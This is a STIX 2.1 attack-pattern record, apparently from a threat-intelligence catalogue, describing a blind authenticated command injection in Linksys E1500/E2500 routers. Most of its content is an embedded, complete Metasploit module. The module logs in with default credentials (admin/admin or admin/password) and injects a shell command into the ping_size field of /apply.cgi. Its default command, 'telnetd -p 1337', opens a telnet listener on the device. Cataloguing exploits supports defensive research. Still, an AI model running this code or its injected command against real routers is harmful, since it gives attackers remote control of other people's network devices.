{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--82289a1b-ffa1-47e2-ae7f-11c073a662d5",
    "created": "2024-08-14T16:23:18.468311Z",
    "modified": "2024-08-14T16:23:18.468315Z",
    "name": "Linksys E1500/E2500 Remote Command Execution",
    "description": " Some Linksys Routers are vulnerable to an authenticated OS command injection. Default credentials for the web interface are admin/admin or admin/password. Since it is a blind os command injection vulnerability, there is no output for the executed command. A ping command against a controlled system for can be used for testing purposes. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/linksys_e1500_e2500_exec.rb",
            "external_id": "linksys_e1500_e2500_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.s3cur1ty.de/m1adv2013-004"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Linksys E1500/E2500 Remote Command Execution',\n        'Description' => %q{\n          Some Linksys Routers are vulnerable to an authenticated OS command injection.\n          Default credentials for the web interface are admin/admin or admin/password. Since\n          it is a blind os command injection vulnerability, there is no output for the\n          executed command. A ping command against a controlled system for can be used for\n          testing purposes.\n        },\n        'Author' => [ 'Michael Messner <devnull[at]s3cur1ty.de>' ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'OSVDB', '89912' ],\n          [ 'BID', '57760' ],\n          [ 'EDB', '24475' ],\n          [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-004' ]\n        ],\n        'DisclosureDate' => '2013-02-05'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('HttpUsername', [ true, 'User to login with', 'admin']),\n        OptString.new('HttpPassword', [ true, 'Password to login with', 'password']),\n        OptString.new('CMD', [ true, 'The command to execute', 'telnetd -p 1337'])\n      ]\n    )\n  end\n\n  def run\n    uri = '/apply.cgi'\n    user = datastore['HttpUsername']\n    pass = datastore['HttpPassword']\n\n    print_status(\"#{rhost}:#{rport} - Trying to login with #{user} / #{pass}\")\n\n    begin\n      res = send_request_cgi({\n        'uri' => uri,\n        'method' => 'GET',\n        'authorization' => basic_auth(user, pass)\n      })\n\n      return if res.nil?\n      return if (res.code == 404)\n\n      if [200, 301, 302].include?(res.code)\n        print_good(\"#{rhost}:#{rport} - Successful login #{user}/#{pass}\")\n      else\n        print_error(\"#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}\")\n        return\n      end\n    rescue ::Rex::ConnectionError\n      vprint_error(\"#{rhost}:#{rport} - Failed to connect to the web server\")\n      return\n    end\n\n    print_status(\"#{rhost}:#{rport} - Sending remote command: \" + datastore['CMD'])\n\n    cmd = datastore['CMD']\n    # original post request:\n    # data_cmd = \"submit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_ping&\n    # action=&commit=0&ping_ip=1.1.1.1&ping_size=%26#{cmd}%26&ping_times=5&traceroute_ip=\"\n\n    vprint_status(\"#{rhost}:#{rport} - using the following target URL: #{uri}\")\n    begin\n      res = send_request_cgi({\n        'uri' => uri,\n        'method' => 'POST',\n        'authorization' => basic_auth(user, pass),\n        'vars_post' => {\n          'submit_button' => 'Diagnostics',\n          'change_action' => 'gozila_cgi',\n          'submit_type' => 'start_ping',\n          'action' => '',\n          'commit' => '0',\n          'ping_ip' => '1.1.1.1',\n          'ping_size' => \"&#{cmd}&\",\n          'ping_times' => '5',\n          'traceroute_ip' => ''\n        }\n      })\n    rescue ::Rex::ConnectionError\n      vprint_error(\"#{rhost}:#{rport} - Failed to connect to the web server\")\n      return\n    end\n    print_status(\"#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state\")\n    print_status(\"#{rhost}:#{rport} - Blind Exploitation - wait around 10 seconds till the command gets executed\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-02-05"
}